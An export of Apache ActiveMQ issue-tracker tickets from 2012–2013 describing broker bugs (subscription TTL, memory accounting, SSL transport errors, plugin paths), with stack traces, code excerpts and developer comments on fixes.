Problem with activemq-blueprint,AMQ-4152,12614325,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,davsclaus,alexander.osadchiy,alexander.osadchiy,01/Nov/12 09:24,30/Oct/13 09:49,14/Jul/23 05:43,30/Oct/13 09:49,5.7.0,,,,,5.9.0,,,,,,,0,,,,,,,,,"When I try to install ActiveMQ with blueprint support to the Karaf container:
{noformat}
features:install activemq-blueprint
activemq:create-broker
{noformat}

I get an exception:
{noformat}
2012-11-01 11:10:14,950 | WARN  | raf-2.2.9/deploy | fileinstall                      | 6 - org.apache.felix.fileinstall - 3.2.4 | Error while starting bundle: spring:file:/mnt/data/apache-karaf-2.2.9/deploy/localhost-broker.xml
org.osgi.framework.BundleException: Unresolved constraint in bundle localhost-broker.xml [78]: Unable to resolve 78.0: missing requirement [78.0] package; (package=org.apache.activemq.hooks)
	at org.apache.felix.framework.Felix.resolveBundle(Felix.java:3564)[org.apache.felix.framework-3.2.2.jar:]
	at org.apache.felix.framework.Felix.startBundle(Felix.java:1797)[org.apache.felix.framework-3.2.2.jar:]
	at org.apache.felix.framework.BundleImpl.start(BundleImpl.java:927)[org.apache.felix.framework-3.2.2.jar:]
	at org.apache.felix.fileinstall.internal.DirectoryWatcher.startBundle(DirectoryWatcher.java:1244)[6:org.apache.felix.fileinstall:3.2.4]
	at org.apache.felix.fileinstall.internal.DirectoryWatcher.startBundles(DirectoryWatcher.java:1216)[6:org.apache.felix.fileinstall:3.2.4]
	at org.apache.felix.fileinstall.internal.DirectoryWatcher.process(DirectoryWatcher.java:505)[6:org.apache.felix.fileinstall:3.2.4]
	at org.apache.felix.fileinstall.internal.DirectoryWatcher.run(DirectoryWatcher.java:291)[6:org.apache.felix.fileinstall:3.2.4]
{noformat}

Log file is attached",,alexander.osadchiy,davsclaus,xldai,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"01/Nov/12 09:25;alexander.osadchiy;karaf.log;https://issues.apache.org/jira/secure/attachment/12551688/karaf.log",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,253568,,,Wed Oct 30 09:49:57 UTC 2013,,,,,,,,,,,"0|i0dvk7:",79043,,,,,,,,,,,,,,,,,,,,,"24/Jun/13 10:16;xldai;It's Not a bug, ""activemq:create-broker -t blueprint"" should be used to create broker when you installed activemq-blueprint feature.;;;","30/Oct/13 09:49;davsclaus;AMQ 5.9 can install in Karaf;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Removal of inactive durable subscribers not working after broker restart,AMQ-4149,12614132,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,tabish,lostincomputer,lostincomputer,31/Oct/12 06:51,01/Nov/12 23:09,14/Jul/23 05:43,01/Nov/12 19:45,5.6.0,5.7.0,,,,5.8.0,,,Broker,,,,0,,,,,,,,,"ActiveMQ can automatically unsubscribe durable subscribers that are not active for some period of time http://activemq.apache.org/manage-durable-subscribers.html.
It however, doesn't remove inactive subscriptions created before it is restarted.

Steps to reproduce:
1) Configure ActiveMQ to remove inactive durable subscriptions
2) Create a durable subscription
3) Restart broker

the inactive durable subscription is never removed",,lostincomputer,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"01/Nov/12 14:48;lostincomputer;DurableSubscriptionRemoveOfflineTest.java;https://issues.apache.org/jira/secure/attachment/12551716/DurableSubscriptionRemoveOfflineTest.java","01/Nov/12 01:03;lostincomputer;activemq.xml;https://issues.apache.org/jira/secure/attachment/12551657/activemq.xml",,,,,,,,,,,,,,,,,,,,2.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,253261,,,Thu Nov 01 23:09:28 UTC 2012,,,,,,,,,,,"0|i0dcvb:",76014,,,,,,,,,,,,,,,,,,,,,"31/Oct/12 13:11;tabish;Added test to DurableSubscriptionRemoveOfflineTest with broker restart, inactive subscription was cleaned up as expected.  Perhaps you can look and modify to reflect your configuration and reproduce what you are seeing.  ;;;","01/Nov/12 01:03;lostincomputer;Attached is the activemq.xml I use for manual testing. The unit test steps is the same as my manual testing. I will try to debug why the unit test fails to reproduce.;;;","01/Nov/12 14:48;lostincomputer;Fixed unit test. Assert should be done in the return of Wait.waitFor();;;","01/Nov/12 19:26;tabish;Thanks for the fix, not sure what I was thinking there.  Will looking into the issue. ;;;","01/Nov/12 19:45;tabish;Fixed now, offline timestamp on restart wasn't getting reset. ;;;","01/Nov/12 23:09;lostincomputer;Thanks for the quick fix! The Wait.waitFor() must also be asserted in the testRemove() test case.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"Static subscriptions from network bridges do not respect TTL (off by one in calculation), resulting in duplicate consumers.",AMQ-4148,12614131,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,,stirlingc,stirlingc,31/Oct/12 06:22,24/Jan/13 18:41,14/Jul/23 05:43,24/Jan/13 18:41,5.8.0,,,,,5.8.0,,,,,,,0,,,,,,,,,"Symptom
=======
The remote broker path is not set on network consumers that result from static subscriptions; as a result, they are forwarded to other bridges even when the network TTL on the bridges is 1.  In an n+1 hub-and-spoke network, the next broker to join receives n subscriptions instead of 1.

Cause
=====
A consumer for a static subscriptions is created by the following code:

{code:title=DemandForwardingBridgeSupport.java}
private void startLocalBridge() throws Throwable {
...
    if (!disposed.get()) {
            setupStaticDestinations();
        } else {
            LOG.warn(""Network connection between "" + localBroker + "" and "" + remoteBroker + ""("" + remoteBrokerName + "") was interrupted during establishment."");
        }
    }
}

/**
 * Subscriptions for these destinations are always created
 */
protected void setupStaticDestinations() {
...
            DemandSubscription sub = createDemandSubscription(dest);
            try {
                addSubscription(sub);
            } catch (IOException e) {
                LOG.error(""Failed to add static destination "" + dest, e);
            }
            if (LOG.isTraceEnabled()) {
                LOG.trace(""bridging messages for static destination: "" + dest);
            }
        }
    }
}

final protected DemandSubscription createDemandSubscription(ActiveMQDestination destination) {
    ConsumerInfo info = new ConsumerInfo();
    info.setDestination(destination);

    // the remote info held by the DemandSubscription holds the original consumerId,
    // the local info get's overwritten
    info.setConsumerId(new ConsumerId(localSessionInfo.getSessionId(), consumerIdGenerator.getNextSequenceId()));
    DemandSubscription result = null;
    try {
        result = createDemandSubscription(info);
    } catch (IOException e) {
        LOG.error(""Failed to create DemandSubscription "", e);
    }
    return result;
}
{code}

Note how the broker path is *not* set on the {{ConsumerInfo}} that is used for the subscription.  

In contrast, a consumer for a dynamic subscription does have its broker path updated to indicate that it is from a remote broker:

{code:title=DemandForwardingBridgeSupport.java}
protected void serviceRemoteCommand(Command command) {
    if (!disposed.get()) {
        try {
            if (command.isMessageDispatch()) {
                safeWaitUntilStarted();
                MessageDispatch md = (MessageDispatch) command;
                serviceRemoteConsumerAdvisory(md.getMessage().getDataStructure());
                ackAdvisory(md.getMessage());
...

private void serviceRemoteConsumerAdvisory(DataStructure data) throws IOException {
...
        if (addConsumerInfo(info)) {
                if (LOG.isDebugEnabled()) {
                    LOG.debug(configuration.getBrokerName() + "" bridged sub on "" + localBroker + "" from "" + remoteBrokerName + "" : "" + info);
                }
            } else {
                if (LOG.isDebugEnabled()) {
                    LOG.debug(configuration.getBrokerName() + "" Ignoring sub from "" + remoteBrokerName + "" as already subscribed to matching destination : "" + info);
                }
            }
        }
...

protected boolean addConsumerInfo(final ConsumerInfo consumerInfo) throws IOException {
    boolean consumerAdded = false;
    ConsumerInfo info = consumerInfo.copy();
    addRemoteBrokerToBrokerPath(info);
...
{code}

Because of this difference, a static subscription will be forwarded to new bridges with a {{null}} brokerPath while a dynamic subscription to the same queue will be forwarded with a singleton brokerPath.  As a result, static subscriptions will be propagated one further hop than their dynamic counterparts.  In the case of a network TTL of 1, the static subscription consumers from existing bridges are unexpectedly propagated to new bridges, while the dynamic subscription consumers are correctly suppressed.

Solution
========
There should be no logical difference between a network consumer created for a static subscription vs. a dynamic subscription.  In either case, the bridge creates a consumer on behalf of the remote broker.  As such, the consumer for a static subscription should have the remote broker in its broker path because it represents a subscription from that remote broker (even if there is no consumer).
",,stirlingc,tabish,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"31/Oct/12 06:29;stirlingc;AMQ4148.patch;https://issues.apache.org/jira/secure/attachment/12551495/AMQ4148.patch","31/Oct/12 06:26;stirlingc;AMQ4148Test.java;https://issues.apache.org/jira/secure/attachment/12551494/AMQ4148Test.java",,,,,,,,,,,,,,,,,,,,2.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,253260,,,Thu Jan 24 18:41:02 UTC 2013,,,,,,,Patch Available,,,,"0|i0dcv3:",76013,,,,,,,,,,,,,,,,,,,,,"31/Oct/12 06:26;stirlingc;Unit test that demonstrates bug by failing an assertion resulting from the duplicate/unexpected subscription propagation.;;;","31/Oct/12 06:29;stirlingc;Patch that, once applied, allows AMQ4148Test to pass.;;;","24/Jan/13 18:40;tabish;Does indeed appear to be an issue.  I tweaked the test a bit to ensure it doesn't fail because it didn't sleep long enough, and also ensure it doesn't hang on shutdown.  ;;;","24/Jan/13 18:41;tabish;Nice investigation, applied the patch and an updated version of the test. ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Memory usage incorrectly updated across network of brokers when VMTransport is used.,AMQ-4147,12614093,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,tabish,stirlingc,stirlingc,30/Oct/12 22:16,31/Mar/15 21:42,14/Jul/23 05:43,01/Feb/13 15:54,5.7.0,,,,,5.8.0,,,,,,,0,,,,,,,,,"Symptom
=======
I was writing some unit tests based on {{org.apache.activemq.JmsMultipleBrokersTestSupport}}, and noticed the following issue:

When brokers are connected in a network using VMTransport (i.e., VMTransport on both the local and remote ends of a bridge), and a message moves from broker1 to broker2, the memory usage of the message continues to be accounted for on broker1 until the message is actually consumed on broker2.  

If the brokers are bridged using a non-VM transport (e.g., TCP), memory usage on broker1 is reduced as soon as the message is bridged to broker2, and broker2's memory usage increases until the message is consumed.

Cause
=====
The cause is the same as in AMQ-4116: {{Message.copy()}} copies the {{memoryUsage}} object.  As a result, when the message moves from broker1 to broker2, the original {{memoryUsage}} object, which refers to broker1 is copied through to broker2 and never updated to broker2's {{memoryUsage}} object.

Specifically, the message is copied from the local transport before being sent to the remote transport by this code:

{code:title=DemandForwardingBridgeSupport.java}
protected void serviceLocalCommand(Command command) {
    if (!disposed.get()) {
        try {
            if (command.isMessageDispatch()) {
                enqueueCounter.incrementAndGet();
                final MessageDispatch md = (MessageDispatch) command;
                final DemandSubscription sub = subscriptionMapByLocalId.get(md.getConsumerId());
                if (sub != null && md.getMessage() != null && sub.incrementOutstandingResponses()) {

                    if (suppressMessageDispatch(md, sub)) {
                        if (LOG.isDebugEnabled()) {
                            LOG.debug(configuration.getBrokerName() + "" message not forwarded to "" + remoteBrokerName + "" because message came from there or fails networkTTL, brokerPath: "" + Arrays.toString(md.getMessage().getBrokerPath()) + "", message: "" + md.getMessage());
                        }
                        // still ack as it may be durable
                        try {
                            localBroker.oneway(new MessageAck(md, MessageAck.INDIVIDUAL_ACK_TYPE, 1));
                        } finally {
                            sub.decrementOutstandingResponses();
                        }
                        return;
                    }

                    Message message = configureMessage(md);
...

protected Message configureMessage(MessageDispatch md) {
    Message message = md.getMessage().copy();
...

{code}

This bug is not present when a non-VM transport is used for the bridge because {{Message.memoryUsage}} is marked transient *not* copied during serialization/deserialization over the transport.

Solution
========
Since this is at least the second bug to result from the current {{Message.copy()}} behaviour, I think ""Solution 1"" proposed from AMQ-4116 is starting to look attractive as both a solution to AMQ-4116 and this bug:

Modify {{Message.copy()}} so that it sets the resulting message's {{memoryUsage}} object to {{null}}.  This would make {{Message.copy()}} behave more similarly to serialization/deserialization.

",,donnchadh,stirlingc,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-5169,,,,,,,,,,,,,AMQ-4116,,,,,,,,,,,,,"30/Oct/12 22:35;stirlingc;AMQ4147Test.java;https://issues.apache.org/jira/secure/attachment/12551437/AMQ4147Test.java",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,253221,,,Fri Feb 01 15:54:34 UTC 2013,,,,,,,Patch Available,,,,"0|i0dcj3:",75959,,,,,,,,,,,,,,,,,,,,,"30/Oct/12 22:35;stirlingc;Unit test demonstrating issue on VM transport, but no problem with TCP transport;;;","30/Oct/12 22:44;stirlingc;AMQ-4116 and AMQ-4137 both have the same cause, but exhibit different problems.;;;","31/Jan/13 22:48;tabish;Added a fix to prevent the Bridge from propagating MemoryUsage values when copying.  Will look further at why we would ever want to copy MemoryUsage in Message.copy().  ;;;","01/Feb/13 15:54;tabish;Fixed on trunk by having the bridge clear the memory usage.  ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
IntrospectionSupport does not convert from primitive to Wrapper classes appropriately,AMQ-4145,12614039,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,ceposta,ceposta,ceposta,30/Oct/12 15:29,31/Oct/12 14:24,14/Jul/23 05:43,31/Oct/12 14:24,5.7.0,,,,,,,,Transport,,,,0,,,,,,,,,"In the TcpTransportServer#handleSocket method, we see that the default values for certain options (among them, trace, maxInactivityDuration, soTimeout, etc) are converted to their wrapper equivalents. 

However in IntrospectionSupport#convert(Object value, Class to) the conversion is not done properly. It always throws the IllegalArgumentException. 

Found in this message trail, although can be seen in other attempts to set variables directly on the transport server.

Possibly related to changes for AMQ-3797 ??",,ceposta,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,253162,,,Wed Oct 31 14:24:40 UTC 2012,,,,,,,,,,,"0|i0dc3j:",75889,Regression,,,,,,,,,,,,,,,,,,,,"31/Oct/12 13:12;tabish;Got a test case ?;;;","31/Oct/12 13:14;ceposta;Yep, working on one right now :);;;","31/Oct/12 14:24;ceposta;Fixed with commit r1404165

Tests added, TypeConverter updated;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
SimpleAuthenticationPluginTest hangs intermittently on Hudson,AMQ-4142,12613936,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,,kearls,kearls,29/Oct/12 18:43,29/Oct/12 20:53,14/Jul/23 05:43,29/Oct/12 20:53,5.7.0,,,,,5.8.0,,,Test Cases,,,,0,,,,,,,,,The SimpleAuthenticationPluginTest sometimes hangs on Hudson,,kearls,tabish,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"29/Oct/12 18:45;kearls;SimpleAuthenticationPluginTest_hangs.patch;https://issues.apache.org/jira/secure/attachment/12551226/SimpleAuthenticationPluginTest_hangs.patch",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,252859,,,Mon Oct 29 20:53:34 UTC 2012,,,,,,,Patch Available,,,,"0|i0d9v3:",75527,,,,,,,,,,,,,,,,,,,,,"29/Oct/12 18:45;kearls;This patch just adds a setup() method which calls setAutoFail(true);;;","29/Oct/12 19:22;tabish;Applied the patch on trunk.  ;;;","29/Oct/12 20:53;tabish;Patch applied.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"maven-activemq-plugin fails to resolve path to XBean file in multi-module builds, and does not have a skip flag",AMQ-4140,12613792,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Blocker,Fixed,tabish,mcarre,mcarre,28/Oct/12 06:41,13/Mar/13 19:25,14/Jul/23 05:43,31/Oct/12 12:50,5.7.0,,,,,5.8.0,,,Broker,,,,0,maven,patch,,,,,,,"Hi,

I am using ActiveMQ and have some integration tests leveraging the maven-activemq-plugin.

I have found that:

1. path to XBean files are not resolved properly, as:
- the path is relative, and therefore, multi-module builds fail;
- at least under Windows, the generated path is not a valid URL, hence the plugin fails on this call: final BrokerService broker = BrokerFactory.createBroker(configUri);

2. unlike other Maven plugins, maven-activemq-plugin doesn't follow the convention of having a skip flag, to skip execution under some circumstances. This is not a bug, but rather an improvement that would make users' life easier IMO (and at least, mine).

In the attachments, I have provided:
- a multi-module build that would allow you to easily and systematically replicate the above two issues: maven-activemq-plugin-user-acceptance-test.zip
- a ""fixed"" version of maven-activemq-plugin, based on trunk / 5.8-SNAPSHOT (as of 2012/10/28 06:34 BST): maven-activemq-plugin.zip
- a patch, containing the equivalent fix, in case this format is preferred: maven-activemq-plugin.patch

I hope this will help to have this resolved in a 5.7.1 or 5.8 version of the plugin very soon? :-)

Cheers,

M.

P.S. : In case you need committers, I would be happy to occasionally help.
(I noticed the documentation for this plugin is rather outdated, so could help with that at least)",Windows and Linux,mcarre,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,3600,3600,,0%,3600,3600,,,,,,,,,,,,,,,,,,,,,AMQ-2293,,,,,,,,,,,,,"13/Mar/13 19:25;mcarre;maven-activemq-plugin-5.7.0-patched.zip;https://issues.apache.org/jira/secure/attachment/12573560/maven-activemq-plugin-5.7.0-patched.zip","28/Oct/12 06:42;mcarre;maven-activemq-plugin-user-acceptance-test.zip;https://issues.apache.org/jira/secure/attachment/12551108/maven-activemq-plugin-user-acceptance-test.zip","30/Oct/12 23:27;mcarre;maven-activemq-plugin.patch;https://issues.apache.org/jira/secure/attachment/12551453/maven-activemq-plugin.patch","30/Oct/12 23:27;mcarre;maven-activemq-plugin.zip;https://issues.apache.org/jira/secure/attachment/12551454/maven-activemq-plugin.zip",,,,,,,,,,,,,,,,,,4.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,252576,,,Wed Mar 13 19:25:19 UTC 2013,,,,,,,Patch Available,,,,"0|i0cv3r:",72983,,,,,,,,,,,,,,,,,,,,,"30/Oct/12 13:54;tabish;Gave the patch a quick spin, the unit test fails on my Linux platform, you should try this out on a Non-Windows machine and see what other issues might exist.  ;;;","30/Oct/12 23:27;mcarre;My apologies for not having double-checked this case earlier. 
I have re-uploaded a new version tested under:
- Linux
- Windows

and which passes the unit tests and the attached user acceptance tests, under both the two OS:

- multi-module build (maven-activemq-plugin-client-multimodule),
- single/simple module (maven-activemq-plugin-client-simple).;;;","31/Oct/12 12:50;tabish;Patch applied with thanks.;;;","31/Oct/12 13:24;mcarre;Thanks Timothy!;;;","13/Mar/13 19:25;mcarre;Attached {{5.7.0}} patched, with a modified POM which plays well with the rest of the {{5.7.0}} modules, in case some people want to deploy them to their repo using:
{code}mvn deploy:deploy-file -DpomFile=pom.xml -Dfile=maven-activemq-plugin-5.7.0-patched.jar -DgroupId=org.apache.activemq.tooling -DartifactId=maven-activemq-plugin -Dversion=5.7.0-patched -Dpackaging=jar -DrepositoryId=My-Release-Repo -Durl=http://host:port/nexus/content/repositories/releases{code};;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Bug in stomp+nio+ssl,AMQ-4135,12613491,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,tabish,mpaladin,mpaladin,25/Oct/12 14:09,02/May/13 02:30,14/Jul/23 05:43,14/Feb/13 22:18,5.6.0,5.7.0,5.8.0,,,5.9.0,,,,,,,0,,,,,,,,,"We have seen a new bug in the stomp+nio+ssl connector (reproducible), the same error has been seen with stomp+ssl as well (not reproducible for now).

Setup:
- one producer send ~10000 as N messages of different sizes to a queue
- different sequential consumers (> 3) consume 1/Nth of the messages from the queue

The unit test provided add a test to StompLoadTest, with this new test:
- StompLoadTest always succeed
- StompSSLLoadTest succeeded but we noticed {{bad record MAC}} error in a deployed broker
- StompNIOSSLLoadTest always fails with one of the two exceptions reported below

{noformat}
testStompSlice(org.apache.activemq.transport.stomp.StompNIOSSLLoadTest)  Time elapsed: 13.551 sec  <<< ERROR!
javax.net.ssl.SSLException: Invalid padding
        at sun.security.ssl.Alerts.getSSLException(Alerts.java:208)
        at sun.security.ssl.SSLSocketImpl.fatal(SSLSocketImpl.java:1902)
        at sun.security.ssl.SSLSocketImpl.readRecord(SSLSocketImpl.java:981)
        at sun.security.ssl.SSLSocketImpl.readDataRecord(SSLSocketImpl.java:884)
        at sun.security.ssl.AppInputStream.read(AppInputStream.java:102)
        at sun.security.ssl.AppInputStream.read(AppInputStream.java:69)
        at java.io.DataInputStream.readByte(DataInputStream.java:265)
        at org.apache.activemq.transport.stomp.StompWireFormat.unmarshal(StompWireFormat.java:123)
        at org.apache.activemq.transport.stomp.StompConnection.receive(StompConnection.java:77)
        at org.apache.activemq.transport.stomp.StompLoadTest.testStompSlice(StompLoadTest.java:261)
{noformat}

{noformat}
testStompSlice(org.apache.activemq.transport.stomp.StompNIOSSLLoadTest)  Time elapsed: 14.86 sec  <<< ERROR!
javax.net.ssl.SSLException: bad record MAC
        at sun.security.ssl.Alerts.getSSLException(Alerts.java:208)
        at sun.security.ssl.SSLSocketImpl.fatal(SSLSocketImpl.java:1902)
        at sun.security.ssl.SSLSocketImpl.fatal(SSLSocketImpl.java:1855)
        at sun.security.ssl.SSLSocketImpl.readRecord(SSLSocketImpl.java:988)
        at sun.security.ssl.SSLSocketImpl.readDataRecord(SSLSocketImpl.java:884)
        at sun.security.ssl.AppInputStream.read(AppInputStream.java:102)
        at sun.security.ssl.AppInputStream.read(AppInputStream.java:69)
        at java.io.DataInputStream.readByte(DataInputStream.java:265)
        at org.apache.activemq.transport.stomp.StompWireFormat.readHeaderLine(StompWireFormat.java:155)
        at org.apache.activemq.transport.stomp.StompWireFormat.readLine(StompWireFormat.java:148)
        at org.apache.activemq.transport.stomp.StompWireFormat.parseAction(StompWireFormat.java:170)
        at org.apache.activemq.transport.stomp.StompWireFormat.unmarshal(StompWireFormat.java:98)
        at org.apache.activemq.transport.stomp.StompConnection.receive(StompConnection.java:77)
        at org.apache.activemq.transport.stomp.StompLoadTest.testStompSlice(StompLoadTest.java:261)
{noformat}",,ccondit,donnchadh,lionel.cons,mpaladin,tabish,traylenator,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-4312,,,,,,,,,,,,AMQ-4321,"25/Oct/12 14:10;mpaladin;StompLoadTest.diff;https://issues.apache.org/jira/secure/attachment/12550779/StompLoadTest.diff",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,251029,,,Thu Feb 14 22:18:19 UTC 2013,,,,,,,,,,,"0|i0b3dz:",62661,,,,,,,,,,,,,,,,,,,,,"25/Oct/12 14:10;mpaladin;Attaching unit test.;;;","25/Oct/12 20:35;tabish;Running locally with the supplied test using the latest trunk code and I cannot get any of these exceptions.;;;","26/Oct/12 06:30;lionel.cons;FWIW, I also get similar errors using a Perl client. Here is what gets logged:

{code}
2012-10-26 08:26:02,971 [ActiveMQ NIO Worker 49] WARN Transport - Transport Connection to: tcp://1.1.4.3:34160 failed: javax.net.ssl.SSLException: Received fatal alert: bad_record_mac
2012-10-26 08:26:02,979 [ActiveMQ NIO Worker 48] WARN Transport - Transport Connection to: tcp://1.1.4.3:34161 failed: javax.net.ssl.SSLException: Received fatal alert: bad_record_mac
2012-10-26 08:26:03,006 [ActiveMQ NIO Worker 48] WARN Transport - Transport Connection to: tcp://1.1.4.3:34162 failed: javax.net.ssl.SSLException: Received fatal alert: bad_record_mac
2012-10-26 08:26:14,780 [ActiveMQ NIO Worker 49] WARN Transport - Transport Connection to: tcp://1.1.4.3:34190 failed: javax.net.ssl.SSLException: Inbound closed before receiving peer's close_notify: possible truncation attack?
{code};;;","26/Oct/12 07:45;mpaladin;Timothy, it still fails for me, I've tried in 3 different hardware with both java 6 & 7. Which test did you run exactly?

My patch add a test to {{StompLoadTest.java}} but you should run {{StompNIOSSLLoadTest.java}} test, I do run:
{noformat}
mvn -Dtest=StompNIOSSLLoadTest#testStompSlice test
{noformat};;;","26/Oct/12 14:54;tabish;Yea, was running the wrong test last night, to many hours starring NIO is not good for the brain.  I'm seeing this as well, not sure what is going on.;;;","04/Feb/13 13:31;lionel.cons;Tim, any progress on this one?;;;","04/Feb/13 14:19;tabish;Nope, patches welcomed. ;;;","04/Feb/13 19:06;tabish;Note that the attached test is no longer valid against trunk code. ;;;","12/Feb/13 20:29;ccondit;FWIW, We are seeing similar problems on openwire nio+ssl under load as well, observed on both 5.7.0 and 5.8.0.

I have created AMQ-4312 to track that issue, with an attached test case.;;;","12/Feb/13 23:43;ccondit;Patch available in AMQ-4312 should fix this issue as well.;;;","13/Feb/13 01:24;tabish;Managed to get this one again after some more testing.  ;;;","14/Feb/13 20:29;ccondit;Since STOMP+NIO+SSL inherits most of the NIO+SSL functionality, it is likely this issue is broken by AMQ-4321 as well.;;;","14/Feb/13 22:18;tabish;Ran the failing STOMP NIO test on both my machines for awhile and don't see the problem anymore so this looks to be sorted now. ;;;","14/Feb/13 22:18;tabish;Fixed;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
